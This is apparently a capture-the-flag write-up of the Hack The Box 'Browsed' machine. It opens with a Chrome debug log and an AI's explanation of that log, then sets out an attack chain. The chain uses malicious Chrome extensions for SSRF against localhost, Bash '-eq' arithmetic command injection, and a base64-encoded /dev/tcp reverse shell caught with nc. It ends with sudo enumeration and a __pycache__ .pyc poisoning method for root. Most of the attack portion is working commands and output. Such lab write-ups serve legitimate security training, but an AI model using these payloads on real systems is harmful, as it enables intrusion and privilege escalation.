[2180:2193:0601/053756.825595:VERBOSE1:ukm_database_backend.cc(328)] Output from SQL query SELECT IFNULL(COUNT(metric_value),0)FROM uma_metrics WHERE metric_hash='F806CECA7515DAAD' AND profile_id=? AND type=? AND metric_value IN(1)AND event_timestamp BETWEEN ? AND ? Bind values: 0:2466474089 1:2 2:2026-05-04 05:37:56.823999 UTC 3:2026-06-01 05:37:56.823999 UTC  Result: 0.000000,
[2180:2180:0601/053756.825589:VERBOSE1:segment_info_database.cc(208)] SaveSegmentResult: saving: PredictionResult: timestamp: 13424765876824571 result 0: 1 for segment id: OPTIMIZATION_TARGET_SEGMENTATION_CHROME_LOW_USER_ENGAGEMENT
[2180:2193:0601/053756.825707:VERBOSE1:ukm_database_backend.cc(328)] Output from SQL query SELECT IFNULL(COUNT(metric_value),0)FROM uma_metrics WHERE metric_hash='FCA0EC1277E6DBE0' AND profile_id=? AND type=? AND metric_value IN(1)AND event_timestamp BETWEEN ? AND ? Bind values: 0:2466474089 1:2 2:2026-05-04 05:37:56.823999 UTC 3:2026-06-01 05:37:56.823999 UTC  Result: 0.000000,
[2180:2193:0601/053756.825774:VERBOSE1:ukm_database_backend.cc(328)] Output from SQL query SELECT IFNULL(COUNT(metric_value),0)FROM uma_metrics WHERE metric_hash='FCA0EC1277E6DBE0' AND profile_id=? AND type=? AND metric_value IN(0,2,3)AND event_timestamp BETWEEN ? AND ? Bind values: 0:2466474089 1:2 2:2026-05-04 05:37:56.823999 UTC 3:2026-06-01 05:37:56.823999 UTC  Result: 0.000000,
[2180:2193:0601/053756.825838:VERBOSE1:ukm_database_backend.cc(328)] Output from SQL query SELECT IFNULL(COUNT(metric_value),0)FROM uma_metrics WHERE metric_hash='DA0925D2758C07B7' AND profile_id=? AND type=? AND metric_value IN(1)AND event_timestamp BETWEEN ? AND ? Bind values: 0:2466474089 1:2 2:2026-05-04 05:37:56.823999 UTC 3:2026-06-01 05:37:56.823999 UTC  Result: 0.000000,
[2180:2180:0601/053756.826055:VERBOSE1:cached_result_writer.cc(30)] CachedResultWriter updating prefs with new result: PredictionResult: timestamp: 13424765876824571 result 0: 1 for segmentation key: chrome_low_user_engagement
[2180:2193:0601/053756.826251:VERBOSE1:ukm_database_backend.cc(328)] Output from SQL query SELECT COUNT(id) FROM metrics WHERE metric_hash = '64BD7CCE5A95BF00' Bind values:  Result: 0.000000,
[2180:2180:0601/053756.826271:VERBOSE1:model_executor_impl.cc(189)] Segmentation model input:  feature 0: 0 feature 1: 0 feature 2: 0 feature 3: 0 for segment CROSS_DEVICE_USER_SEGMENT
[2180:2180:0601/053756.826314:VERBOSE1:model_executor_impl.cc(189)] Segmentation model input:  feature 0: 0 feature 1: 0 feature 2: 0 feature 3: 0 feature 4: 0 for segment RESUME_HEAVY_USER_SEGMENT
[2180:2180:0601/053756.826343:VERBOSE1:model_executor_impl.cc(189)] Segmentation model input:  feature 0: 0 feature 1: 0 feature 2: 0 feature 3: 0 feature 4: 0 feature 5: 0 feature 6: 0 for segment PASSWORD_MANAGER_USER
[2180:2180:0601/053756.826360:VERBOSE1:model_executor_impl.cc(189)] Segmentation model input:  feature 0: 0 feature 1: 0 feature 2: 0 feature 3: 0 for segment OPTIMIZATION_TARGET_SEGMENTATION_SHOPPING_USER
[2180:2180:0601/053756.826401:VERBOSE1:model_executor_impl.cc(218)] Segmentation model result:  output 0: 1 for segment CROSS_DEVICE_USER_SEGMENT
[2180:2180:0601/053756.826445:VERBOSE1:segment_result_provider.cc(29)] ComputeDiscreteMapping: segment=: result=1, rank=1
[2180:2180:0601/053756.826472:VERBOSE1:segment_result_provider.cc(359)] OnModelExecuted: Default model executed successfully. Result: PredictionResult: timestamp: 13424765876826437 result 0: 1 for segment CROSS_DEVICE_USER_SEGMENT
[2180:2180:0601/053756.826500:VERBOSE1:segment_info_database.cc(208)] SaveSegmentResult: saving: PredictionResult: timestamp: 13424765876826437 result 0: 1 for segment id: CROSS_DEVICE_USER_SEGMENT
[2180:2180:0601/053756.826587:VERBOSE1:model_executor_impl.cc(218)] Segmentation model result:  output 0: 0 for segment RESUME_HEAVY_USER_SEGMENT
[2180:2180:0601/053756.826632:VERBOSE1:segment_result_provider.cc(29)] ComputeDiscreteMapping: segment=: result=0, rank=0
[2180:2180:0601/053756.826648:VERBOSE1:segment_result_provider.cc(359)] OnModelExecuted: Default model executed successfully. Result: PredictionResult: timestamp: 13424765876826626 result 0: 0 for segment RESUME_HEAVY_USER_SEGMENT
[2180:2180:0601/053756.826668:VERBOSE1:segment_info_database.cc(208)] SaveSegmentResult: saving: PredictionResult: timestamp: 13424765876826626 result 0: 0 for segment id: RESUME_HEAVY_USER_SEGMENT
[2180:2180:0601/053756.826723:VERBOSE1:model_executor_impl.cc(218)] Segmentation model result:  output 0: 0 for segment PASSWORD_MANAGER_USER
[2180:2180:0601/053756.826753:VERBOSE1:segment_result_provider.cc(29)] ComputeDiscreteMapping: segment=: result=0, rank=0
[2180:2180:0601/053756.826768:VERBOSE1:segment_result_provider.cc(359)] OnModelExecuted: Default model executed successfully. Result: PredictionResult: timestamp: 13424765876826747 result 0: 0 for segment PASSWORD_MANAGER_USER
[2180:2180:0601/053756.826801:VERBOSE1:segment_info_database.cc(208)] SaveSegmentResult: saving: PredictionResult: timestamp: 13424765876826747 result 0: 0 for segment id: PASSWORD_MANAGER_USER
[2180:2180:0601/053756.826900:VERBOSE1:model_executor_impl.cc(218)] Segmentation model result:  output 0: 0 for segment OPTIMIZATION_TARGET_SEGMENTATION_SHOPPING_USER
[2180:2180:0601/053756.826932:VERBOSE1:segment_result_provider.cc(29)] ComputeDiscreteMapping: segment=: result=0, rank=0
[2180:2180:0601/053756.826940:VERBOSE1:segment_result_provider.cc(359)] OnModelExecuted: Default model executed successfully. Result: PredictionResult: timestamp: 13424765876826929 result 0: 0 for segment OPTIMIZATION_TARGET_SEGMENTATION_SHOPPING_USER
[2180:2180:0601/053756.826959:VERBOSE1:segment_info_database.cc(208)] SaveSegmentResult: saving: PredictionResult: timestamp: 13424765876826929 result 0: 0 for segment id: OPTIMIZATION_TARGET_SEGMENTATION_SHOPPING_USER
[2180:2180:0601/053756.827050:VERBOSE1:cached_result_writer.cc(30)] CachedResultWriter updating prefs with new result: PredictionResult: timestamp: 13424765876826437 result 0: 1 for segmentation key: cross_device_user
[2180:2180:0601/053756.827101:VERBOSE1:cached_result_writer.cc(30)] CachedResultWriter updating prefs with new result: PredictionResult: timestamp: 13424765876826626 result 0: 0 for segmentation key: resume_heavy_user
[2180:2180:0601/053756.827163:VERBOSE1:cached_result_writer.cc(30)] CachedResultWriter updating prefs with new result: PredictionResult: timestamp: 13424765876826747 result 0: 0 for segmentation key: password_manager_user
[2180:2180:0601/053756.827237:VERBOSE1:cached_result_writer.cc(30)] CachedResultWriter updating prefs with new result: PredictionResult: timestamp: 13424765876826929 result 0: 0 for segmentation key: shopping_user
[2180:2180:0601/053756.827471:VERBOSE1:model_executor_impl.cc(189)] Segmentation model input:  feature 0: 0 feature 1: 0 for segment OPTIMIZATION_TARGET_SEGMENTATION_SEARCH_USER
[2180:2180:0601/053756.827512:VERBOSE1:model_executor_impl.cc(218)] Segmentation model result:  output 0: 0 for segment OPTIMIZATION_TARGET_SEGMENTATION_SEARCH_USER
[2180:2180:0601/053756.827535:VERBOSE1:segment_result_provider.cc(29)] ComputeDiscreteMapping: segment=: result=0, rank=0
[2180:2180:0601/053756.827561:VERBOSE1:segment_result_provider.cc(359)] OnModelExecuted: Default model executed successfully. Result: PredictionResult: timestamp: 13424765876827532 result 0: 0 for segment OPTIMIZATION_TARGET_SEGMENTATION_SEARCH_USER
[2180:2180:0601/053756.827584:VERBOSE1:segment_info_database.cc(208)] SaveSegmentResult: saving: PredictionResult: timestamp: 13424765876827532 result 0: 0 for segment id: OPTIMIZATION_TARGET_SEGMENTATION_SEARCH_USER
[2180:2180:0601/053756.827664:VERBOSE1:cached_result_writer.cc(30)] CachedResultWriter updating prefs with new result: PredictionResult: timestamp: 13424765876827532 result 0: 0 for segmentation key: search_user
[2180:2199:0601/053759.841295:VERBOSE1:shutdown_signal_handlers_posix.cc(136)] Handling shutdown for signal 15.


```

AI say that Claude responded: This is a Chrome browser debug log from a Linux system.

![Pasted image 20260601134444.png](/ob/Pasted%20image%2020260601134444.png)

This is a **Chrome browser debug log** from a Linux system. Specifically, it's the verbose/diagnostic output from **Google Chrome for Testing** (a special Chrome build used for automated browser testing).

Here's what the key sections mean:

**Startup messages** — Chrome initializing its processes, display (X11), audio/media devices, GPU, and extensions like the PDF viewer.

**Errors (the `ERROR:` lines)** — Mostly harmless in this context. Chrome couldn't write cache files to `/var/www/.cache/` because the directory either doesn't exist or lacks write permissions. The `bus.cc` errors mean D-Bus (Linux inter-process communication) isn't available — common in headless/server environments.

**Segmentation model logs** — Chrome's built-in ML system evaluating user behavior segments (shopping user, password manager user, low engagement, etc.) to personalize features. All scores came back 0 since this appears to be a fresh/empty profile.

**The final line** — `signal 15` is `SIGTERM`, meaning Chrome was cleanly shut down (killed intentionally, not a crash).

**Bottom line:** This looks like a log from an **automated testing or CI/CD environment** running Chrome headlessly (no real user, no D-Bus, limited filesystem access). The errors are expected in that kind of sandboxed setup and don't indicate anything seriously wrong.

For building this Chrome extension, we can refer to this guide. We primarily need two files -

Create a zip file containing manifest.json and background.js .

### manifest.json

```
{
  "manifest_version": 3,
  "name": "Replace Images",
  "version": "1.0.0",
  "description": "Replaces every image on a page with one from a URL.",
  "permissions": ["scripting"],
  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "js": ["content.js"],
      "run_at": "document_idle"
    }
  ]
}
```

### content.js

In this case, for all users when the page idles, it will inject `content.js` into the page:

```
// use an image of your liking !
// const replacementImageUrl = "Your favourite image here"
const replacementImageUrl = "https://preview.redd.it/why-is-larry-so-evil-v0-ty3qlu4swjle1.jpeg?auto=webp&s=41fc3ee5bcec63e5cb4cc69757a812fb80143f47"

document.querySelectorAll('img').forEach(img => {
  img.src = replacementImageUrl;
  img.srcset = "";
});
```

```
┌─[tester@parrot]─[~/Desktop/HTB/Browsed]
└──╼ $zip upload.zip manifest.json content.js 
  adding: manifest.json (deflated 40%)
  adding: content.js (deflated 29%)

```

{{< toggle "Tag 🏷️" >}}

{{< tag "logs-discover" >}} use the linux 's grep function to extract urls ,Put the web 's error message to the log file and discover the browsedinternals domain

{{< /toggle >}}

```
┌─[tester@parrot]─[~/Desktop/HTB/Browsed]
└──╼ $cat logs.txt |  grep -oP 'https?://\S+'
http://clients2.google.com/time/1/current?cup2key=8:DzbkdEtRnPykPwxvHObqsAPBYpF5D7k-wd31u6QHwHE&cup2hreq=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
http://browsedinternals.htb/
http://localhost/
https://accounts.google.com/ListAccounts?gpsia=1&source=ChromiumBrowser&json=standard
http://browsedinternals.htb/assets/css/index.css?v=1.24.5
http://browsedinternals.htb/assets/css/theme-gitea-auto.css?v=1.24.5
http://browsedinternals.htb/assets/img/logo.svg
http://localhost/assets/css/main.css
http://localhost/images/pic01.jpg
http://localhost/images/pic02.jpg
http://localhost/images/pic03.jpg
http://localhost/assets/css/fontawesome-all.min.css
https://fonts.googleapis.com/css?family=Roboto:100,300,100italic,300italic
http://localhost/assets/js/jquery.min.js
http://localhost/assets/js/jquery.scrolly.min.js
http://localhost/assets/js/jquery.dropotron.min.js
http://localhost/assets/js/jquery.scrollex.min.js
http://browsedinternals.htb/assets/js/webcomponents.js?v=1.24.5
http://browsedinternals.htb/assets/js/index.js?v=1.24.5
http://localhost/assets/js/browser.min.js
http://localhost/assets/js/breakpoints.min.js
http://localhost/assets/js/util.js
http://localhost/assets/js/main.js
https://preview.redd.it/why-is-larry-so-evil-v0-ty3qlu4swjle1.jpeg?auto=webp&s=41fc3ee5bcec63e5cb4cc69757a812fb80143f47

```

{{< toggle "Tag 🏷️" >}}

{{< tag "CMS-unauthenticated-Gitea-enum" >}} Although without cred in Gitea , but I can in the Explore to view the source code by git clone

{{< /toggle >}}

add the `browsedinternals.htb` into the /etc/hosts

![Pasted image 20260601142154.png](/ob/Pasted%20image%2020260601142154.png)

It has a Python `app.py`, as well as a brief `README`, a shell script, and some folders:

![Pasted image 20260601142445.png](/ob/Pasted%20image%2020260601142445.png)

Due i am not login now , show I cant modify the file to have the RCE

![Pasted image 20260601142316.png](/ob/Pasted%20image%2020260601142316.png)

I’ll clone the repo to my host to take a look:

```
┌─[✗]─[tester@parrot]─[~/Desktop/HTB/Browsed]
└──╼ $git clone http://browsedinternals.htb/larry/MarkdownPreview.git
Cloning into 'MarkdownPreview'...
remote: Enumerating objects: 15, done.
remote: Counting objects: 100% (15/15), done.
remote: Compressing objects: 100% (12/12), done.
remote: Total 15 (delta 0), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (15/15), done.

```

```
┌─[tester@parrot]─[~/Desktop/HTB/Browsed/MarkdownPreview]
└──╼ $git log
commit dfa9f4c093b4d67f6a3ffeb8f9b0bafa67a70bef (HEAD -> main, origin/main, origin/HEAD)
Author: larry <a@a.a>
Date:   Sun Aug 17 11:05:43 2025 +0000

    First commit !

commit 41168a4313122211f5eb240e25d1ec289ddfcaa0
Author: larry <a@a.a>
Date:   Sun Aug 17 11:01:21 2025 +0000

    Initial commit

```

Nothing Found  , so do the check the source code

{{< toggle "Tag 🏷️" >}}

{{< tag "Source-Code-Review-Python-Chrome-extension-Upload" >}} That is the example for how to build the upload function website with Flask in python.

{{< /toggle >}}

`app.py` is a Python Flask application:

```
┌─[tester@parrot]─[~/Desktop/HTB/Browsed/MarkdownPreview]
└──╼ $cat app.py 
from flask import Flask, request, send_from_directory, redirect
from werkzeug.utils import secure_filename

import markdown
import os, subprocess
import uuid

app = Flask(__name__)
FILES_DIR = "files"

# Ensure the files/ directory exists
os.makedirs(FILES_DIR, exist_ok=True)

@app.route('/')
def index():
    return '''
    <h1>Markdown Previewer</h1>
    <form action="/submit" method="POST">
        <textarea name="content" rows="10" cols="80"></textarea><br>
        <input type="submit" value="Render & Save">
    </form>
    <p><a href="/files">View saved HTML files</a></p>
    '''


@app.route('/submit', methods=['POST'])
def submit():
    content = request.form.get('content', '')
    if not content.strip():
        return 'Empty content. <a href="/">Go back</a>'

    # Convert markdown to HTML
    html = markdown.markdown(content)

    # Save HTML to unique file
    filename = f"{uuid.uuid4().hex}.html"
    filepath = os.path.join(FILES_DIR, filename)
    with open(filepath, 'w') as f:
        f.write(html)

    return f'''
    <p>File saved as <code>{filename}</code>.</p>
    <p><a href="/view/{filename}">View Rendered HTML</a></p>
    <p><a href="/">Go back</a></p>
    '''

@app.route('/files')
def list_files():
    files = [f for f in os.listdir(FILES_DIR) if f.endswith('.html')]
    links = '\n'.join([f'<li><a href="/view/{f}">{f}</a></li>' for f in files])
    return f'''
    <h1>Saved HTML Files</h1>
    <ul>{links}</ul>
    <p><a href="/">Back to editor</a></p>
    '''

@app.route('/routines/<rid>')
def routines(rid):
    # Call the script that manages the routines
    # Run bash script with the input as an argument (NO shell)
    subprocess.run(["./routines.sh", rid])
    return "Routine executed !"

@app.route('/view/<filename>')
def view_file(filename):
    filename = secure_filename(filename)
    if not filename.endswith('.html'):
        return "Invalid filename", 400
    return send_from_directory(FILES_DIR, filename)

# The webapp should only be accessible through localhost
if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)

```

The application listens on localhost:5000 and sets up five routes:

* `/` shows a basic HTML page and form for submitting markdown.
* `/submit` takes a POST request to upload markdown, which is converted to HTML and saved with a random name to the `files` directory.
* `/files` shows a page that displays the saved HTML files.
* `/view/<filename>` shows the HTML file.
* `/routines/<rid>` calls a shell script, `routines.sh`, with the given `rid` as its input.

`routines.sh` runs some basic maintenance tasks based on the given ID. The ID is checked against the numbers 0 - 3, and then the appropriate shell commands are run, or an error is printed.

{{< toggle "Tag 🏷️" >}}

{{< tag "Source-Code-Review-bash-logic-compare" >}} routines.sh bash runs some basic maintenance tasks based on the given ID. The ID is checked against the numbers 0 - 3, and then the appropriate shell commands are run, or an error is printed.

{{< /toggle >}}

```
#!/bin/bash

ROUTINE_LOG="/home/larry/markdownPreview/log/routine.log"
BACKUP_DIR="/home/larry/markdownPreview/backups"
DATA_DIR="/home/larry/markdownPreview/data"
TMP_DIR="/home/larry/markdownPreview/tmp"

log_action() {
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$ROUTINE_LOG"
}

if [[ "$1" -eq 0 ]]; then
  # Routine 0: Clean temp files
  find "$TMP_DIR" -type f -name "*.tmp" -delete
  log_action "Routine 0: Temporary files cleaned."
  echo "Temporary files cleaned."

elif [[ "$1" -eq 1 ]]; then
  # Routine 1: Backup data
  tar -czf "$BACKUP_DIR/data_backup_$(date '+%Y%m%d_%H%M%S').tar.gz" "$DATA_DIR"
  log_action "Routine 1: Data backed up to $BACKUP_DIR."
  echo "Backup completed."

elif [[ "$1" -eq 2 ]]; then
  # Routine 2: Rotate logs
  find "$ROUTINE_LOG" -type f -name "*.log" -exec gzip {} \;
  log_action "Routine 2: Log files compressed."
  echo "Logs rotated."

elif [[ "$1" -eq 3 ]]; then
  # Routine 3: System info dump
  uname -a > "$BACKUP_DIR/sysinfo_$(date '+%Y%m%d').txt"
  df -h >> "$BACKUP_DIR/sysinfo_$(date '+%Y%m%d').txt"
  log_action "Routine 3: System info dumped."
  echo "System info saved."

else
  log_action "Unknown routine ID: $1"
  echo "Routine ID not implemented."
fi
```

The only place the user input is used is in the evaluation of which mode to run.

### manifest.json -- 2

I want to get access to `localhost:5000` on Browsed, so I’ll use the extension sandbox. I’ll create a `manifest.json`:

```
{
  "manifest_version": 3,
  "name": "Read Localhost port 5000",
  "version": "1.0.0",
  "description": "Grab the page on localhost:5000 and return it to me.",
  "permissions": ["scripting"],
  "host_permissions": ["<all_urls>"],
  "background": {
    "service_worker": "background.js"
  }
}
```

There are a couple of differences here besides the unimportant metadata. I’m running the JavaScript as a background worker rather than a content script, where it would be subject to CORS policy. Background/service workers can access any URL listed in the `host_permissions` settings.

I’ll make a simple JavaScript file (with the filename matching the `service_worker` defined in the JSON above) to read `http://localhost:5000` and return it to me:

```
┌─[tester@parrot]─[~/Desktop/HTB/Browsed]
└──╼ $zip upload1.zip background.js manifest.json 
  adding: background.js (deflated 20%)
  adding: manifest.json (deflated 36%)

```

```
┌─[tester@parrot]─[~/Desktop/HTB/Browsed]
└──╼ $sudo python3 -m http.server 80
[sudo] password for tester: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.244.79 - - [01/Jun/2026 14:40:19] "GET /?d=CiAgICA8aDE+TWFya2Rvd24gUHJldmlld2VyPC9oMT4KICAgIDxmb3JtIGFjdGlvbj0iL3N1Ym1pdCIgbWV0aG9kPSJQT1NUIj4KICAgICAgICA8dGV4dGFyZWEgbmFtZT0iY29udGVudCIgcm93cz0iMTAiIGNvbHM9IjgwIj48L3RleHRhcmVhPjxicj4KICAgICAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iUmVuZGVyICYgU2F2ZSI+CiAgICA8L2Zvcm0+CiAgICA8cD48YSBocmVmPSIvZmlsZXMiPlZpZXcgc2F2ZWQgSFRNTCBmaWxlczwvYT48L3A+CiAgICA= HTTP/1.1" 200 -


```

That decodes to the page:

```
┌─[✗]─[tester@parrot]─[~/Desktop/HTB/Browsed]
└──╼ $echo "CiAgICA8aDE+TWFya2Rvd24gUHJldmlld2VyPC9oMT4KICAgIDxmb3JtIGFjdGlvbj0iL3N1Ym1pdCIgbWV0aG9kPSJQT1NUIj4KICAgICAgICA8dGV4dGFyZWEgbmFtZT0iY29udGVudCIgcm93cz0iMTAiIGNvbHM9IjgwIj48L3RleHRhcmVhPjxicj4KICAgICAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iUmVuZGVyICYgU2F2ZSI+CiAgICA8L2Zvcm0+CiAgICA8cD48YSBocmVmPSIvZmlsZXMiPlZpZXcgc2F2ZWQgSFRNTCBmaWxlczwvYT48L3A+CiAgICA=" | base64 -d 

    <h1>Markdown Previewer</h1>
    <form action="/submit" method="POST">
        <textarea name="content" rows="10" cols="80"></textarea><br>
        <input type="submit" value="Render & Save">
    </form>
    <p><a href="/files">View saved HTML files</a></p>

```

### OS-Command-Injection

{{< toggle "Tag 🏷️" >}}

{{< tag "OWASP-OS-Command-Injection" >}} The vulnerability in this script is the lines that compare the input to numbers using -eq in bash,However, because -eq triggers Bash arithmetic evaluation, and Bash arithmetic evaluates array subscript expressions (including command substitutions within them), I can get it to run arbitrary commands

{{< /toggle >}}

It does what I would expect:

```
┌─[tester@parrot]─[~/Desktop/HTB/Browsed]
└──╼ $cat exec.sh 
#!/bin/bash

NUM="$1"
if [[ "$NUM" -eq 100 ]];then
  echo "OK"
else
  echo "NG"
fi

```

```
┌─[tester@parrot]─[~/Desktop/HTB/Browsed]
└──╼ $./exec.sh 100
OK
┌─[tester@parrot]─[~/Desktop/HTB/Browsed]
└──╼ $./exec.sh 102
NG

```

However, because -eq triggers Bash arithmetic evaluation, and Bash arithmetic evaluates array subscript expressions (including command substitutions within them), I can get it to run arbitrary commands:

```
┌─[✗]─[tester@parrot]─[~/Desktop/HTB/Browsed]
└──╼ $./exec.sh 'a[$(id)]'
./exec.sh: line 4: uid=1000(tester) gid=1005(tester) groups=1005(tester),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),101(netdev),1000(lpadmin),1001(scanner),1002(bluetooth),1003(docker),1004(podman): syntax error in expression (error token is "(tester) gid=1005(tester) groups=1005(tester),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),101(netdev),1000(lpadmin),1001(scanner),1002(bluetooth),1003(docker),1004(podman)")

```

```
┌─[✗]─[tester@parrot]─[~/Desktop/HTB/Browsed]
└──╼ $./exec.sh "a[$(id)]"
./exec.sh: line 4: uid=1000(tester) gid=1005(tester) groups=1005(tester),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),101(netdev),1000(lpadmin),1001(scanner),1002(bluetooth),1003(docker),1004(podman): syntax error in expression (error token is "(tester) gid=1005(tester) groups=1005(tester),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),101(netdev),1000(lpadmin),1001(scanner),1002(bluetooth),1003(docker),1004(podman)")

```

```
┌─[tester@parrot]─[~/Desktop/HTB/Browsed]
└──╼ $cat exec.sh 
#!/bin/bash

NUM="$1"
if [[ ""a[$(id)]"" -eq 100 ]];then
  echo "OK"
else
  echo "NG"
fi

```

Putting the SSRF and the Bash arithmetic evaluation injection together, I should be able to run commands on the remote server. I’ll use the same `manifest.json` (updating the `name` and `description` if I want to), and update `background.js`:

I’ll create a base64-encoded [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) back to my host:

### RCE

{{< toggle "Tag 🏷️" >}}

{{< tag "Reverser-Shell-base64-javascript" >}} Using the javascript 's fetch function to trigger the base64 reverse shell to have the RCE

{{< /toggle >}}

```
┌─[tester@parrot]─[~/Desktop/HTB/Browsed]
└──╼ $echo 'bash  -i >& /dev/tcp/10.10.16.128/443  0>&1  ' | base64 
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTAwLzQ0MyAgMD4mMSAgCg==

```

```
┌─[tester@parrot]─[~/Desktop/HTB/Browsed]
└──╼ $cat background.js 
fetch("http://localhost:5000/routines/" + encodeURIComponent("a[$(echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTAwLzQ0MyAgMD4mMSAgCg== | base64 -d | bash)]"));
```

zip the background.js  and manifest.json again to package it to upload the website

```
┌─[tester@parrot]─[~/Desktop/HTB/Browsed]
└──╼ $sudo  nc -lnvp 443 
Listening on 0.0.0.0 443
Connection received on 10.129.244.79 37724
bash: cannot set terminal process group (1441): Inappropriate ioctl for device
bash: no job control in this shell
larry@browsed:~/markdownPreview$ 

```

# Shell as Root

```
larry@browsed:~$ ls -al 
ls -al 
total 56
drwxr-x--- 9 larry larry 4096 Jan  6 11:11 .
drwxr-xr-x 4 root  root  4096 Jan  6 10:28 ..
lrwxrwxrwx 1 root  root     9 Dec 29 09:55 .bash_history -> /dev/null
-rw-r--r-- 1 larry larry  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 larry larry 3771 Mar 31  2024 .bashrc
drwx------ 4 larry larry 4096 Jan  6 10:28 .cache
drwx------ 3 larry larry 4096 Jan  6 10:28 .config
-rw-rw-r-- 1 larry larry   36 Aug 17  2025 .gitconfig
drwx------ 3 larry larry 4096 Jan  6 10:28 .gnupg
drwxrwxr-x 3 larry larry 4096 Jan  6 10:28 .local
drwxrwxr-x 9 larry larry 4096 Jan  6 10:28 markdownPreview
drwx------ 3 larry larry 4096 Jan  6 10:28 .pki
-rw-r--r-- 1 larry larry  807 Mar 31  2024 .profile
lrwxrwxrwx 1 larry larry    9 Aug 17  2025 .python_history -> /dev/null
drwx------ 2 larry larry 4096 Jan  6 10:28 .ssh
-rw-r----- 1 root  larry   33 Jun  1 06:59 user.txt

```

```
larry@browsed:/home$ ls  
ls
git
larry

```

{{< toggle "Tag 🏷️" >}}

{{< tag "Linux-Enumation-who-in-the-box" >}}  using the cat /etc/passwd | grep 'bash\$' to know who in the shell ?

{{< /toggle >}}

```
cat /etc/passwd | grep 'sh$' 
root:x:0:0:root:/root:/bin/bash
larry:x:1000:1000:larry:/home/larry:/bin/bash
git:x:110:110:Git Version Control,,,:/home/git:/bin/bash
larry@browsed:/home$ cat /etc/passwd | grep 'bash$'
```

```
larry@browsed:/home$ whoami 
whoami 
larry

```

```
larry@browsed:/home$ cd git
cd git
bash: cd: git: Permission denied

```

{{< toggle "Tag 🏷️" >}}

{{< tag "Linux-Privilege-sudo-l" >}} Using the sudo -l to know that the user can run /opt/extensiontool/extension\_tool.py with no password by root.

{{< /toggle >}}

```
larry@browsed:/home$ sudo -l 
sudo -l 
Matching Defaults entries for larry on browsed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User larry may run the following commands on browsed:
    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
larry@browsed:/home$ 

```

{{< toggle "Tag 🏷️" >}}

{{< tag "Linux-Privilege-python-Library-Hijacking" >}} The hint is that I can run the python as the root due to sudo -l ,so poising the python script as the python script uses the **pycache** of pyc to as the Cache files , so I can write the script and run to have the root

{{< /toggle >}}

```
larry@browsed:/home$ ls -l /opt/extensiontool/extension_tool.py
ls -l /opt/extensiontool/extension_tool.py
-rwxrwxr-x 1 root root 2739 Mar 27  2025 /opt/extensiontool/extension_tool.py

```

Three things must be true for this attack to work:

* **A privileged process** (e.g. running via `sudo`) imports a Python **module**
* **The `.py` source file is not writable** by the attacker, but...
* **The `__pycache__/` directory is world-writable** — meaning anyone can add/remove files in it

The attack steps

* **Grab the legitimate `.pyc` header** — the first 16 bytes contain magic number, flags, timestamp, and source size. Python uses these to validate the file, so you reuse them
* **Compile malicious source** — take the original source, append your payload, and compile it with Python's `compile()` + `marshal.dumps()`
* **Replace the `.pyc`** — delete the legitimate file (possible because the *directory* is writable even if the file isn't), write your poisoned version with the original header
* **Trigger the privileged import** — when `sudo` runs the script next, it loads your `.pyc`, executing your payload with elevated privileges

Why the header reuse matters

* Python checks the header for consistency. Using the real header makes the file appear legitimate so Python doesn't fall back to recompiling from the `.py` source.

The `extensiontool` project directory has four objects:

```
total 24
drwxr-xr-x 4 root root 4096 Dec 11 07:54 .
drwxr-xr-x 4 root root 4096 Aug 17  2025 ..
drwxrwxr-x 5 root root 4096 Mar 23  2025 extensions
-rwxrwxr-x 1 root root 2739 Mar 27  2025 extension_tool.py
-rw-rw-r-- 1 root root 1245 Mar 23  2025 extension_utils.py
drwxrwxrwx 2 root root 4096 Dec 11 07:57 __pycache__

```

```
larry@browsed:/opt/extensiontool$ ls -la __pycache__/
ls -la __pycache__/
total 8
drwxrwxrwx 2 root root 4096 Jun  1 07:40 .
drwxr-xr-x 4 root root 4096 Dec 11 07:54 ..

```

### **pycache**

The most important thing to note about `__pycache__` is that it’s world writable. I’ll come back to that later.

```
larry@browsed:/opt/extensiontool$ /opt/extensiontool/extension_tool.py
/opt/extensiontool/extension_tool.py
[X] Use one of the following extensions : ['Fontify', 'Timer', 'ReplaceImages']
larry@browsed:/opt/extensiontool$ ls -la __pycache__/
ls -la __pycache__/
total 12
drwxrwxrwx 2 root  root  4096 Jun  1 07:46 .
drwxr-xr-x 4 root  root  4096 Dec 11 07:54 ..
-rw-r--r-- 1 larry larry 1880 Jun  1 07:46 extension_utils.cpython-312.pyc

```

```
larry@browsed:/opt/extensiontool/__pycache__$ touch test
touch test
larry@browsed:/opt/extensiontool/__pycache__$ ls
ls
extension_utils.cpython-312.pyc
test

```

### extension\_utils.py

`extension_utils.py` holds two functions, `validate_manifest` and `clean_temp_files`. Exactly what they do isn’t super important.

```
#!/usr/bin/python3.12
import json
import os
from argparse import ArgumentParser
from extension_utils import validate_manifest, clean_temp_files
import zipfile

EXTENSION_DIR = '/opt/extensiontool/extensions/'

def bump_version(data, path, level='patch'):
    version = data["version"]
    major, minor, patch = map(int, version.split('.'))
    if level == 'major':
        major += 1
        minor = patch = 0
    elif level == 'minor':
        minor += 1
        patch = 0
    else:
        patch += 1

    new_version = f"{major}.{minor}.{patch}"
    data["version"] = new_version

    with open(path, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2)
    
    print(f"[+] Version bumped to {new_version}")
    return new_version

def package_extension(source_dir, output_file):
